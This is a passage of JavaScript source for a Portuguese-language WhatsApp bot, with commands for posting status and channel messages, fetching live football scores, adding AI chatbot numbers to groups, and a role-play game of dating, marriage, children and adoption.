            await conn.sendMessage(from, {
                react: { text: '❌', key: info.key }
            });

            return reply(`❌ Use assim:

${prefix + command} seu texto

${prefix + command} 120363xxxxxxxxxx@newsletter seu texto

Ou responda uma imagem/vídeo/áudio com legenda.`);
        }

        innerMsg = {
            extendedTextMessage: {
                text: caption,
                messageContextInfo: { messageSecret }
            }
        };
    }

    if (canalJid) {
        if (mediaType === 'imageMessage') {
            await conn.sendMessage(canalJid, {
                image: mediaBuffer,
                caption: caption || quotedMsg?.imageMessage?.caption || ''
            });
        } else if (mediaType === 'videoMessage') {
            await conn.sendMessage(canalJid, {
                video: mediaBuffer,
                caption: caption || quotedMsg?.videoMessage?.caption || ''
            });
        } else if (mediaType === 'audioMessage') {
            await conn.sendMessage(canalJid, {
                audio: mediaBuffer,
                mimetype: mediaMime || 'audio/mp4',
                ptt: mediaPtt
            });
        } else {
            await conn.sendMessage(canalJid, {
                text:
                    caption ||
                    quotedMsg?.extendedTextMessage?.text ||
                    quotedMsg?.conversation ||
                    ''
            });
        }

        await conn.sendMessage(from, {
            react: { text: '✅', key: info.key }
        });

        return reply('✅ Enviado no canal com sucesso!');
    }

    const msgType = Object.keys(innerMsg)[0];

    if (!msgType || !innerMsg[msgType]) {
        throw new Error('Mensagem inválida para status.');
    }

    innerMsg[msgType].contextInfo = {
        isGroupStatus: true
    };

    const msg = generateWAMessageFromContent(
        from,
        {
            messageContextInfo: { messageSecret },
            groupStatusMessageV2: {
                message: {
                    ...innerMsg,
                    messageContextInfo: { messageSecret }
                }
            }
        },
        {
            userJid: conn.user.id
        }
    );

    await conn.relayMessage(from, msg.message, {
        messageId: msg.key.id
    });

    await conn.sendMessage(from, {
        react: { text: '✅', key: info.key }
    });

    reply('✅ Status enviado com sucesso!');
} catch (e) {
    console.log('ERRO STATUS:', e);

    await conn.sendMessage(from, {
        react: { text: '❌', key: info.key }
    });

    reply('❌ Erro ao enviar status/canal.');
}
}
break;

case 'placar': {
try {
    const pesquisa = q || args.join(' ');

    if (!pesquisa) {
        return reply(`⚽ *PLACAR AO VIVO*

Use:
${prefix + command} Brasil x Japão

Exemplo:
${prefix + command} Flamengo`);
    }

    await conn.sendMessage(from, {
        react: { text: '⏳', key: info.key }
    });

    const { data } = await axios.get(
        `https://zone.api.br/api/placar?search=${encodeURIComponent(pesquisa)}`,
        {
            timeout: 20000,
            headers: {
                'User-Agent': 'Mozilla/5.0'
            }
        }
    );

    if (!data?.status || !data?.result) {
        await conn.sendMessage(from, {
            react: { text: '❌', key: info.key }
        });

        return reply('❌ Não encontrei nenhum placar para essa busca.');
    }

    const res = data.result;

    const casa = res.times?.casa || 'Casa';
    const fora = res.times?.fora || 'Fora';

    const placarCasa = res.placar?.casa ?? '0';
    const placarFora = res.placar?.fora ?? '0';

    const statusJogo = res.status || 'Indefinido';

    const aoVivo = /ao vivo|em andamento|1º tempo|2º tempo|intervalo/i.test(statusJogo);

    let txt = `╭━━〔 ⚽ *KYARA PLACAR* ⚽ 〕━━⬣
┃
┃ ${aoVivo ? '🔴 *AO VIVO*' : '📊 *RESULTADO*'}
┃
┃ 🏠 *${casa}*
┃        ${placarCasa}  x  ${placarFora}
┃ 🛫 *${fora}*
┃
┃ 📌 *Status:* ${statusJogo}
┃
╰━━━━━━━━━━━━━━━━━━⬣`;

    if (res.cronologia && res.cronologia.length > 0) {
        txt += `\n\n╭━━〔 📋 *LANCES IMPORTANTES* 〕━━⬣`;

        const agrupado = {};

        for (const lance of res.cronologia) {
            const periodo = lance.periodo || 'Geral';
            if (!agrupado[periodo]) agrupado[periodo] = [];
            agrupado[periodo].push(lance);
        }

        for (const [periodo, lances] of Object.entries(agrupado)) {
            txt += `\n┃\n┃ 🕒 *${periodo.toUpperCase()}*`;

            for (const lance of lances) {
                const minuto = String(lance.minuto || '?')
                    .replace(/&#39;/g, "'")
                    .replace(/39;/g, "'");

                const time = lance.time || 'Time';
                const tipo = lance.tipo || 'Lance';
                const jogador = lance.jogador || 'Jogador não informado';
                const detalhe = lance.detalhe ? `\n┃    📝 ${lance.detalhe}` : '';

                txt += `\n┃\n┃ ⏱️ *${minuto}* - ${time}
┃ ⚡ *${tipo}:* ${jogador}${detalhe}`;
            }
        }

        txt += `\n┃\n╰━━━━━━━━━━━━━━━━━━⬣`;
    } else {
        txt += `\n\n╭━━〔 📋 *LANCES* 〕━━⬣
┃
┃ ❌ Nenhum lance importante registrado.
┃
╰━━━━━━━━━━━━━━━━━━⬣`;
    }

    await conn.sendMessage(from, {
        text: txt
    }, { quoted: info });

    await conn.sendMessage(from, {
        react: { text: '✅', key: info.key }
    });

} catch (e) {
    console.log('[ERRO PLACAR]', e);

    await conn.sendMessage(from, {
        react: { text: '❌', key: info.key }
    });

    reply('❌ Erro ao buscar o placar. A API pode estar offline ou não encontrou esse jogo.');
}
}
break;

case 'addhey': {
try {
if (!So_Dono) return reply('Apenas o dono pode usar este comando.');
if (!isGroup) return reply('❌ Este comando só funciona em grupos!');

const resultado = await conn.groupParticipantsUpdate(
from,
['18442439728@s.whatsapp.net'],
'add'
);

console.log('ADDHEY RESULTADO:', resultado);

const status = resultado?.[0]?.status;

if (status == 200) {
return reply('✅ HeyPat foi adicionado ao grupo com sucesso.');
}

return reply(`❌ Não consegui adicionar o HayPat.\nStatus: ${status || 'desconhecido'}\n\nVeja o console para mais detalhes.`);
} catch (e) {
console.error(e);
reply(`❌ Erro ao tentar adicionar o HayPat:\n${e.message}`);
}
}
break;

case 'adddola': {
try {
if (!So_Dono) return reply('Apenas o dono pode usar este comando.');
if (!isGroup) return reply('❌ Este comando só funciona em grupos!');

const resultado = await conn.groupParticipantsUpdate(
from,
['16502234435@s.whatsapp.net'],
'add'
);

console.log('ADDDOLA RESULTADO:', resultado);

const status = resultado?.[0]?.status;

if (status == 200) {
return reply('✅ Dola foi adicionado ao grupo com sucesso.');
}

return reply(`❌ Não consegui adicionar a Dola.\nStatus: ${status || 'desconhecido'}\n\nVeja o console para mais detalhes.`);
} catch (e) {
console.error(e);
reply(`❌ Erro ao tentar adicionar o Dola:\n${e.message}`);
}
}
break;

case 'addluz': {
try {
if (!So_Dono) return reply('Apenas o dono pode usar este comando.');
if (!isGroup) return reply('❌ Este comando só funciona em grupos!');

const resultado = await conn.groupParticipantsUpdate(
from,
['34613288116@s.whatsapp.net'],
'add'
);

console.log('ADDLUZ RESULTADO:', resultado);

const status = resultado?.[0]?.status;

if (status == 200) {
return reply('✅ LuzIA foi adicionado ao grupo com sucesso.');
}

return reply(`❌ Não consegui adicionar a LuzIA.\nStatus: ${status || 'desconhecido'}\n\nVeja o console para mais detalhes.`);
} catch (e) {
console.error(e);
reply(`❌ Erro ao tentar adicionar o LuzIA:\n${e.message}`);
}
}
break;

case 'addcopilot': {
try {
if (!So_Dono) return reply('Apenas o dono pode usar este comando.');
if (!isGroup) return reply('❌ Este comando só funciona em grupos!');

const resultado = await conn.groupParticipantsUpdate(
from,
['18772241042@s.whatsapp.net'],
'add'
);

console.log('ADDCOPILOT RESULTADO:', resultado);

const status = resultado?.[0]?.status;

if (status == 200) {
return reply('✅ Copilot foi adicionado ao grupo com sucesso.');
}

return reply(`❌ Não consegui adicionar a Copilot.\nStatus: ${status || 'desconhecido'}\n\nVeja o console para mais detalhes.`);
} catch (e) {
console.error(e);
reply(`❌ Erro ao tentar adicionar o Copilot:\n${e.message}`);
}
}
break;

case 'addperp': {
try {
if (!So_Dono) return reply('Apenas o dono pode usar este comando.');
if (!isGroup) return reply('❌ Este comando só funciona em grupos!');

const resultado = await conn.groupParticipantsUpdate(
from,
['18334363285@s.whatsapp.net'],
'add'
);

console.log('ADDPERP RESULTADO:', resultado);

const status = resultado?.[0]?.status;

if (status == 200) {
return reply('✅ Perplexity foi adicionada ao grupo com sucesso.');
}

if (status == 404) return reply('❌ Número da Perplexity não encontrado ou não adicionável.');
if (status == 406) return reply('❌ A Perplexity recusou entrar no grupo.');

return reply(`❌ Não consegui adicionar a Perplexity.\nStatus: ${status || 'desconhecido'}`);
} catch (e) {
console.error(e);
reply(`❌ Erro ao tentar adicionar a Perplexity:\n${e.message}`);
}
}
break;


// CASE KYARA
//+55 19 99572-9970
//SUPORTE 👆

case 'addai': {
try {

await conn.groupParticipantsUpdate(
from,
['867051314767696@bot'],
'add'
);
reply('✅ ᴍᴇᴛᴀ ᴀɪ ꜰᴏɪ ᴀᴅɪᴄɪᴏɴᴀᴅᴀ ᴀᴏ ɢʀᴜᴘᴏ ᴄᴏᴍ sᴜᴄᴇssᴏ.');
} catch (e) {
console.error(e);
reply('❌ ɴãᴏ ꜰᴏɪ ᴘᴏssíᴠᴇʟ ᴀᴅɪᴄɪᴏɴᴀʀ ᴀ ᴍᴇᴛᴀ ᴀɪ ᴀᴏ ɢʀᴜᴘᴏ.');
}
}
break;

case 'luademel':
case 'lua_de_mel': {
const path = './database/familia.json';

if (!fs.existsSync(path))
fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

const parceiro = familia[sender]?.casadoCom;

if (!parceiro) {
return reply('❌ Apenas pessoas casadas podem viajar em lua de mel.');
}

const destinos = [
'🏝️ Maldivas',
'🗼 Paris',
'🏖️ Cancún',
'🏰 Disney',
'🌴 Havaí',
'🗻 Japão',
'🌆 Nova York',
'🏖️ Fernando de Noronha',
'🚢 Cruzeiro de Luxo',
'🏔️ Suíça'
];

const eventos = [
'❤️ Aproveitaram dias inesquecíveis juntos.',
'🥰 Fortaleceram ainda mais o relacionamento.',
'📸 Tiraram muitas fotos românticas.',
'🌅 Assistiram lindos pores do sol.',
'💑 Viveram momentos especiais.',
'🎉 Criaram memórias para a vida toda.'
];

const destino = destinos[Math.floor(Math.random() * destinos.length)];
const evento = eventos[Math.floor(Math.random() * eventos.length)];

return conn.sendMessage(from, {
text: `╭━━〔 💍 LUA DE MEL 〕━━⬣
┃ ❤️ Casal:
┃ @${sender.split('@')[0]}
┃ ❤️ @${parceiro.split('@')[0]}
┃
┃ ✈️ Destino:
┃ ${destino}
┃
┃ ${evento}
┃
┃ 💕 O amor aumentou!
╰━━━━━━━━━━━━━━⬣`,
mentions: [sender, parceiro]
}, { quoted: selo });

}
break;

case 'encontro': {
const path = './database/familia.json';

if (!fs.existsSync(path))
fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

let alvo = null;
const ctx = info?.message?.extendedTextMessage?.contextInfo || {};

if (ctx.mentionedJid?.[0]) {
  alvo = ctx.mentionedJid[0];
} else if (ctx.participant) {
  alvo = ctx.participant;
}

if (alvo?.includes('@lid') && Infos_Do_Grupo?.participants) {
  const achou = Infos_Do_Grupo.participants.find(p =>
    p.id === alvo
  );

  if (achou?.phoneNumber) {
    alvo = achou.phoneNumber;
  }
}

alvo = alvo ? jidNormalizedUser(alvo) : null;

if (!alvo)
return reply(`❤️ Marque seu parceiro(a).\n\nEx: ${prefix}encontro @user`);

const relacionado =
familia[sender]?.namorandoCom === alvo ||
familia[sender]?.casadoCom === alvo;

if (!relacionado) {
return reply('❌ Você só pode sair com seu namorado(a) ou cônjuge.');
}

const encontros = [
'🍕 Foram jantar em uma pizzaria.',
'🎬 Assistiram um filme juntos.',
'🏖️ Passaram o dia na praia.',
'🌳 Fizeram um piquenique no parque.',
'☕ Tomaram café juntos.',
'🎡 Foram ao parque de diversões.',
'🛍️ Passearam pelo shopping.',
'🌅 Assistiram o pôr do sol.',
'🎮 Jogaram videogame juntos.',
'🚗 Deram uma volta pela cidade.'
];

const evento = encontros[Math.floor(Math.random() * encontros.length)];

return conn.sendMessage(from, {
text: `╭━━〔 ❤️ ENCONTRO 〕━━⬣
┃ ❤️ @${sender.split('@')[0]}
┃ 💕 saiu com
┃ ❤️ @${alvo.split('@')[0]}
┃
┃ ${evento}
┃
┃ 😊 O relacionamento ficou mais forte!
╰━━━━━━━━━━━━━━⬣`,
mentions: [sender, alvo]
}, { quoted: selo });

}
break;

case 'flertar': {
try {
let alvo = null;
const ctx = info?.message?.extendedTextMessage?.contextInfo || {};

if (ctx.mentionedJid?.[0]) alvo = ctx.mentionedJid[0];
else if (ctx.participant) alvo = ctx.participant;

if (alvo?.includes('@lid') && Infos_Do_Grupo?.participants) {
const achou = Infos_Do_Grupo.participants.find(p => p.id === alvo);
if (achou?.phoneNumber) alvo = achou.phoneNumber;
}

alvo = alvo ? jidNormalizedUser(alvo) : null;
const userId = jidNormalizedUser(sender);

if (!alvo) {
return reply(`💘 Marque ou responda alguém.\n\nEx:\n${prefix}flertar @user você é muito linda`);
}

if (alvo === userId) {
return reply('❌ Você não pode flertar consigo mesmo.');
}

const frase = q
.replace(/@\d+/g, '')
.trim();

if (!frase) {
return reply(`💬 Escreva o flerte.\n\nEx:\n${prefix}flertar @user seu sorriso é lindo`);
}

const chance = Math.floor(Math.random() * 101);

let resultado = '';

if (chance >= 75) {
resultado = '😍 A pessoa AMOU o flerte!';
} else if (chance >= 50) {
resultado = '😊 A pessoa gostou do flerte.';
} else if (chance >= 25) {
resultado = '😐 A pessoa ficou meio sem graça.';
} else {
resultado = '💔 A pessoa não curtiu muito...';
}

return conn.sendMessage(from, {
text: `╭━━〔 💘 FLERTE 〕━━⬣
┃ 👤 @${userId.split('@')[0]}
┃ flertou com
┃ 💞 @${alvo.split('@')[0]}
┃
┃ 💬 Fala:
┃ "${frase}"
┃
┃ 🎲 Chance de gostar: ${chance}%
┃ ${resultado}
╰━━━━━━━━━━━━━━⬣`,
mentions: [userId, alvo]
}, { quoted: selo });

} catch (e) {
console.log('[FLERTAR ERROR]', e);
reply('❌ Erro ao flertar.');
}
}
break;

case 'trair': {
const path = './database/familia.json';

if (!fs.existsSync(path))
fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

let alvo = null;
const ctx = info?.message?.extendedTextMessage?.contextInfo || {};

if (ctx.mentionedJid?.[0]) {
  alvo = ctx.mentionedJid[0];
} else if (ctx.participant) {
  alvo = ctx.participant;
}

if (alvo?.includes('@lid') && Infos_Do_Grupo?.participants) {
  const achou = Infos_Do_Grupo.participants.find(p =>
    p.id === alvo
  );

  if (achou?.phoneNumber) {
    alvo = achou.phoneNumber;
  }
}

alvo = alvo ? jidNormalizedUser(alvo) : null;

if (!alvo)
return reply(`❌ Marque alguém.\n\nEx: ${prefix}trair @user`);

if (alvo === sender)
return reply('❌ Você não pode trair consigo mesmo.');

const parceiro =
familia[sender]?.casadoCom ||
familia[sender]?.namorandoCom;

if (!parceiro) {
return reply('❌ Você precisa estar namorando ou casado.');
}

const descobriu = Math.random() < 0.5;

if (descobriu) {
return conn.sendMessage(from, {
text: `╭━━〔 💔 TRAIÇÃO DESCOBERTA 〕━━⬣
┃ 😱 @${parceiro.split('@')[0]} descobriu!
┃
┃ ❤️ Parceiro(a): @${parceiro.split('@')[0]}
┃ 💋 Amante: @${alvo.split('@')[0]}
┃
┃ ⚠️ O relacionamento ficou abalado...
╰━━━━━━━━━━━━━━⬣`,
mentions: [sender, parceiro, alvo]
}, { quoted: selo });
}

return conn.sendMessage(from, {
text: `╭━━〔 😈 TRAIÇÃO 〕━━⬣
┃ 🤫 Ninguém descobriu...
┃
┃ ❤️ Parceiro(a): @${parceiro.split('@')[0]}
┃ 💋 Amante: @${alvo.split('@')[0]}
┃
┃ 👀 Por enquanto está tudo em segredo.
╰━━━━━━━━━━━━━━⬣`,
mentions: [sender, parceiro, alvo]
}, { quoted: selo });
}
break;

case 'transar': {
let alvo = null;
const ctx = info?.message?.extendedTextMessage?.contextInfo || {};

if (ctx.mentionedJid?.[0]) {
  alvo = ctx.mentionedJid[0];
} else if (ctx.participant) {
  alvo = ctx.participant;
}

if (alvo?.includes('@lid') && Infos_Do_Grupo?.participants) {
  const achou = Infos_Do_Grupo.participants.find(p =>
    p.id === alvo
  );

  if (achou?.phoneNumber) {
    alvo = achou.phoneNumber;
  }
}

alvo = alvo ? jidNormalizedUser(alvo) : null;

if (!alvo) return reply(`Marque seu parceiro.\nEx: ${prefix}transar @user`);

return conn.sendMessage(from, {
text: `╭━━〔 ❤️ MOMENTO ROMÂNTICO 〕━━⬣
┃ ❤️ @${sender.split('@')[0]}
┃ 💕 passou um momento gostoso com
┃ ❤️ @${alvo.split('@')[0]}
┃
┃ 😊 O relacionamento ficou mais forte!
╰━━━━━━━━━━━━━━⬣`,
mentions: [sender, alvo]
}, { quoted: selo });
}
break;

case 'beijar': {
const path = './database/familia.json';

if (!fs.existsSync(path))
fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

let alvo = null;
const ctx = info?.message?.extendedTextMessage?.contextInfo || {};

if (ctx.mentionedJid?.[0]) {
  alvo = ctx.mentionedJid[0];
} else if (ctx.participant) {
  alvo = ctx.participant;
}

if (alvo?.includes('@lid') && Infos_Do_Grupo?.participants) {
  const achou = Infos_Do_Grupo.participants.find(p =>
    p.id === alvo
  );

  if (achou?.phoneNumber) {
    alvo = achou.phoneNumber;
  }
}

alvo = alvo ? jidNormalizedUser(alvo) : null;

if (!alvo)
return reply(`💋 Marque alguém.\n\nEx: ${prefix}beijar @user`);

if (alvo === sender)
return reply('❌ Você não pode beijar você mesmo.');

const namorando =
familia[sender]?.namorandoCom === alvo ||
familia[sender]?.casadoCom === alvo;

if (!namorando) {
return reply('❌ Você só pode beijar seu namorado(a) ou cônjuge.');
}

const beijos = [
'💋 Um beijo apaixonado foi dado!',
'😘 Que beijo fofo!',
'❤️ O amor está no ar!',
'🥰 Um momento romântico aconteceu!',
'💞 Que casal lindo!'
];

const msg = beijos[Math.floor(Math.random() * beijos.length)];

return conn.sendMessage(from, {
text: `╭━━〔 💋 BEIJO 〕━━⬣
┃ ❤️ @${sender.split('@')[0]}
┃ 💕 beijou
┃ ❤️ @${alvo.split('@')[0]}
┃
┃ ${msg}
╰━━━━━━━━━━━━━━⬣`,
mentions: [sender, alvo]
}, { quoted: selo });

}
break;

case 'terminar': {
const path = './database/familia.json';

if (!fs.existsSync(path))
fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

if (!familia[sender]?.namorandoCom)
return reply('❌ Você não está namorando.');

const parceiro = familia[sender].namorandoCom;

delete familia[sender].namorandoCom;
delete familia[sender].namoroDesde;

if (familia[parceiro]) {
delete familia[parceiro].namorandoCom;
delete familia[parceiro].namoroDesde;
}

fs.writeFileSync(path, JSON.stringify(familia, null, 2));

return conn.sendMessage(from, {
text: `💔 O relacionamento chegou ao fim.

❤️ Ex: @${sender.split('@')[0]}
❤️ Ex: @${parceiro.split('@')[0]}`,
mentions: [sender, parceiro]
}, { quoted: selo });
}
break;

case 'aceitarnamoro': {
const path = './database/familia.json';

if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
if (!fs.existsSync(path)) fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

const userId = sender;

let chavePedido = null;

if (familia[userId]?.pedidoNamoro) {
chavePedido = userId;
} else {
const numero = userId.split('@')[0];

const achou = Object.keys(familia).find(k =>
k.split('@')[0] === numero &&
familia[k]?.pedidoNamoro
);

if (achou) chavePedido = achou;
}

if (!chavePedido) {
return reply(`❌ Você não possui pedidos de namoro.

ID: ${userId}`);
}

const parceiro = familia[chavePedido].pedidoNamoro.de;

familia[chavePedido] = {
...(familia[chavePedido] || {}),
namorandoCom: parceiro,
namoroDesde: Date.now()
};

familia[parceiro] = {
...(familia[parceiro] || {}),
namorandoCom: chavePedido,
namoroDesde: Date.now()
};

delete familia[chavePedido].pedidoNamoro;

fs.writeFileSync(path, JSON.stringify(familia, null, 2));

return conn.sendMessage(from, {
text: `💕 NAMORO ACEITO!

❤️ @${chavePedido.split('@')[0]}
❤️ @${parceiro.split('@')[0]}

Agora vocês estão namorando.`,
mentions: [chavePedido, parceiro]
}, { quoted: selo });
}
break;

case 'namorar': {
const path = './database/familia.json';

if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
if (!fs.existsSync(path)) fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

const userId = sender;
let alvo = null;

const ctx = info?.message?.extendedTextMessage?.contextInfo || {};

if (ctx.mentionedJid?.[0]) alvo = ctx.mentionedJid[0];
else if (ctx.participant) alvo = ctx.participant;

if (alvo?.includes('@lid') && Infos_Do_Grupo?.participants) {
const achou = Infos_Do_Grupo.participants.find(p => p.id === alvo);
if (achou?.phoneNumber) alvo = achou.phoneNumber;
}

if (!alvo) return reply(`Marque alguém ou responda a mensagem.\nEx: ${prefix}namorar @user`);

if (alvo === userId) return reply('❌ Você não pode namorar consigo mesmo.');

familia[userId] = familia[userId] || {};
familia[alvo] = familia[alvo] || {};

familia[alvo].pedidoNamoro = {
de: userId,
data: Date.now()
};

const alvoNumero = alvo.split('@')[0] + '@s.whatsapp.net';

familia[alvoNumero] = familia[alvoNumero] || {};
familia[alvoNumero].pedidoNamoro = {
de: userId,
data: Date.now()
};

fs.writeFileSync(path, JSON.stringify(familia, null, 2));

return conn.sendMessage(from, {
text: `❤️ @${userId.split('@')[0]} pediu @${alvo.split('@')[0]} em namoro!

Use:
${prefix}aceitarnamoro`,
mentions: [userId, alvo]
}, { quoted: selo });
}
break;

case 'engravidar': {
const path = './database/familia.json';

if (!fs.existsSync(path))
fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

if (!familia[sender]?.casadoCom) {
return reply('❌ Você precisa ser casado para ter um filho.');
}

const nomeBebe = q?.trim();

if (!nomeBebe) {
return reply(`👶 Escolha um nome para o bebê.

Exemplo:
${prefix}engravidar João
${prefix}engravidar Maria Eduarda`);
}

const parceiro = familia[sender].casadoCom;

if (!familia[sender].filhos)
familia[sender].filhos = [];

if (!familia[parceiro].filhos)
familia[parceiro].filhos = [];

const agora = new Date();

const filho = {
nome: nomeBebe,
sexo: Math.random() < 0.5 ? '👦 Menino' : '👧 Menina',
nascimento: Date.now(),
dataNascimento: agora.toLocaleDateString('pt-BR'),
horaNascimento: agora.toLocaleTimeString('pt-BR'),
peso: (Math.random() * (4.5 - 2.5) + 2.5).toFixed(1) + 'kg',
altura: Math.floor(Math.random() * (55 - 45) + 45) + 'cm',
saude: 100,
felicidade: 100,
idade: 0
};

familia[sender].filhos.push(filho);
familia[parceiro].filhos.push(filho);

fs.writeFileSync(path, JSON.stringify(familia, null, 2));

return conn.sendMessage(from, {
text: `╭━━〔 👶 NASCIMENTO 〕━━⬣
┃ ❤️ Responsável:
┃ @${sender.split('@')[0]}
┃
┃ ❤️ Responsável:
┃ @${parceiro.split('@')[0]}
┃
┃ 🎉 Um novo membro chegou!
┃
┃ 👶 Nome: ${filho.nome}
┃ 🚻 Sexo: ${filho.sexo}
┃ 📅 Data: ${filho.dataNascimento}
┃ ⏰ Hora: ${filho.horaNascimento}
┃ ⚖️ Peso: ${filho.peso}
┃ 📏 Altura: ${filho.altura}
┃ ❤️ Saúde: ${filho.saude}%
┃ 😊 Felicidade: ${filho.felicidade}%
┃
┃ Use:
┃ ${prefix}familia
╰━━━━━━━━━━━━━━⬣`,
mentions: [sender, parceiro]
}, { quoted: selo });

}
break;

case 'familia': {
const path = './database/familia.json';

const familia = JSON.parse(fs.readFileSync(path));

if (!familia[sender]) {
return reply('❌ Você não possui família.');
}

const dados = familia[sender];

let txt = `👨‍👩‍👧 FAMÍLIA\n\n`;

txt += `💍 Cônjuge: ${
dados.casadoCom
? '@' + dados.casadoCom.split('@')[0]
: 'Nenhum'
}\n\n`;

txt += `👶 Filhos:\n\n`;

if (!dados.filhos?.length) {

txt += `Nenhum filho registrado.`;

} else {

dados.filhos.forEach((f, i) => {

txt += `╭─ 👶 Filho ${i + 1}\n`;
txt += `┃ Nome: ${f.nome}\n`;
txt += `┃ Sexo: ${f.sexo}\n`;
txt += `┃ Data: ${f.dataNascimento}\n`;
txt += `┃ Hora: ${f.horaNascimento}\n`;
txt += `┃ Peso: ${f.peso}\n`;
txt += `┃ Altura: ${f.altura}\n`;
txt += `┃ Saúde: ${f.saude}%\n`;
txt += `┃ Felicidade: ${f.felicidade}%\n`;
txt += `╰──────────────\n\n`;

});

}

conn.sendMessage(from, {
text: txt,
mentions: dados.casadoCom ? [dados.casadoCom] : []
}, { quoted: selo });
}
break;

case 'adotar': {
const path = './database/familia.json';

if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
if (!fs.existsSync(path)) fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

const userId = jidNormalizedUser(sender);

if (!familia[userId]?.casadoCom) {
return reply('❌ Apenas casados podem adotar.');
}

let alvo = null;
const ctx = info?.message?.extendedTextMessage?.contextInfo || {};

if (ctx.mentionedJid?.[0]) alvo = ctx.mentionedJid[0];
else if (ctx.participant) alvo = ctx.participant;

if (alvo?.includes('@lid') && Infos_Do_Grupo?.participants) {
const achou = Infos_Do_Grupo.participants.find(p => p.id === alvo);
if (achou?.phoneNumber) alvo = achou.phoneNumber;
}

alvo = alvo ? jidNormalizedUser(alvo) : null;

if (!alvo) {
return reply(`👶 Marque quem deseja adotar.\n\nEx: ${prefix}adotar @usuario`);
}

if (alvo === userId) {
return reply('❌ Você não pode adotar a si mesmo.');
}

const parceiro = familia[userId].casadoCom;

if (alvo === parceiro) {
return reply('❌ Você não pode adotar seu cônjuge.');
}

if (!familia[userId].filhos) familia[userId].filhos = [];
if (!familia[parceiro]) familia[parceiro] = {};
if (!familia[parceiro].filhos) familia[parceiro].filhos = [];

const jaAdotado = familia[userId].filhos.some(f => f.id === alvo);

if (jaAdotado) {
return reply('❌ Essa pessoa já é filho(a) de vocês.');
}

let nomeFilho = `@${alvo.split('@')[0]}`;

try {
const membro = Infos_Do_Grupo?.participants?.find(p =>
p.phoneNumber === alvo || p.id === alvo
);

nomeFilho =
membro?.notify ||
membro?.name ||
membro?.pushName ||
`@${alvo.split('@')[0]}`;
} catch {}

const agora = new Date();

const filho = {
id: alvo,
nome: nomeFilho,
sexo: 'Pessoa adotada',
nascimento: Date.now(),
dataNascimento: agora.toLocaleDateString('pt-BR'),
horaNascimento: agora.toLocaleTimeString('pt-BR'),
saude: 100,
felicidade: 100,
adotado: true
};

familia[userId].filhos.push(filho);
familia[parceiro].filhos.push(filho);

fs.writeFileSync(path, JSON.stringify(familia, null, 2));

return conn.sendMessage(from, {
text: `╭━━〔 👶 ADOÇÃO 〕━━⬣
┃ 👶 Novo filho adotado!
┃
┃ Filho(a): @${alvo.split('@')[0]}
┃ Nome salvo: ${nomeFilho}
┃
┃ Pais:
┃ ❤️ @${userId.split('@')[0]}
┃ ❤️ @${parceiro.split('@')[0]}
╰━━━━━━━━━━━━━━⬣`,
mentions: [alvo, userId, parceiro]
}, { quoted: selo });
}
break;

case 'divorcio': {
const path = './database/familia.json';

const familia = JSON.parse(fs.readFileSync(path));

if (!familia[sender]?.casadoCom) {
return reply('❌ Você não é casado.');
}

const parceiro = familia[sender].casadoCom;

delete familia[sender].casadoCom;
delete familia[sender].casadoDesde;

if (familia[parceiro]) {
delete familia[parceiro].casadoCom;
delete familia[parceiro].casadoDesde;
}

fs.writeFileSync(path, JSON.stringify(familia, null, 2));

conn.sendMessage(from, {
text: `💔 @${sender.split('@')[0]} se divorciou de @${parceiro.split('@')[0]}`,
mentions: [sender, parceiro]
}, { quoted: selo });
}
break;

case 'aceitarcasamento': {
const path = './database/familia.json';

if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
if (!fs.existsSync(path)) fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

const userId = jidNormalizedUser(sender);

let chavePedido = null;

if (familia[userId]?.pedidoCasamento) {
chavePedido = userId;
} else {
const numero = userId.split('@')[0];

const achou = Object.keys(familia).find(k =>
k.split('@')[0] === numero &&
familia[k]?.pedidoCasamento
);

if (achou) chavePedido = achou;
}

if (!chavePedido) {
return reply(`❌ Você não possui pedidos de casamento.

ID: ${userId}`);
}

const parceiro = familia[chavePedido].pedidoCasamento.de;

familia[chavePedido] = {
...(familia[chavePedido] || {}),
casadoCom: parceiro,
casadoDesde: Date.now(),
filhos: familia[chavePedido]?.filhos || []
};

familia[parceiro] = {
...(familia[parceiro] || {}),
casadoCom: chavePedido,
casadoDesde: Date.now(),
filhos: familia[parceiro]?.filhos || []
};

delete familia[chavePedido].pedidoCasamento;

fs.writeFileSync(path, JSON.stringify(familia, null, 2));

return conn.sendMessage(from, {
text: `╭━━〔 💍 CASAMENTO ACEITO 〕━━⬣
┃ ❤️ @${chavePedido.split('@')[0]}
┃ ❤️ @${parceiro.split('@')[0]}
┃
┃ Agora vocês estão casados!
╰━━━━━━━━━━━━━━⬣`,
mentions: [chavePedido, parceiro]
}, { quoted: selo });
}
break;

case 'casar': {
const path = './database/familia.json';

if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
if (!fs.existsSync(path)) fs.writeFileSync(path, '{}');

const familia = JSON.parse(fs.readFileSync(path));

let alvo = null;
const ctx = info?.message?.extendedTextMessage?.contextInfo || {};

if (ctx.mentionedJid?.[0]) alvo = ctx.mentionedJid[0];
else if (ctx.participant) alvo = ctx.participant;

if (alvo?.includes('@lid') && Infos_Do_Grupo?.participants) {
const achou = Infos_Do_Grupo.participants.find(p => p.id === alvo);
if (achou?.phoneNumber) alvo = achou.phoneNumber;
}

alvo = alvo ? jidNormalizedUser(alvo) : null;
const userId = jidNormalizedUser(sender);

if (!alvo) {
return reply(`Marque alguém ou responda a mensagem.\nEx: ${prefix}casar @user`);
}

if (alvo === userId) {
return reply('❌ Você não pode casar consigo mesmo.');
}

if (familia[userId]?.casadoCom) {
return reply('❌ Você já é casado.');
}

if (familia[alvo]?.casadoCom) {
return reply('❌ Essa pessoa já é casada.');
}

if (
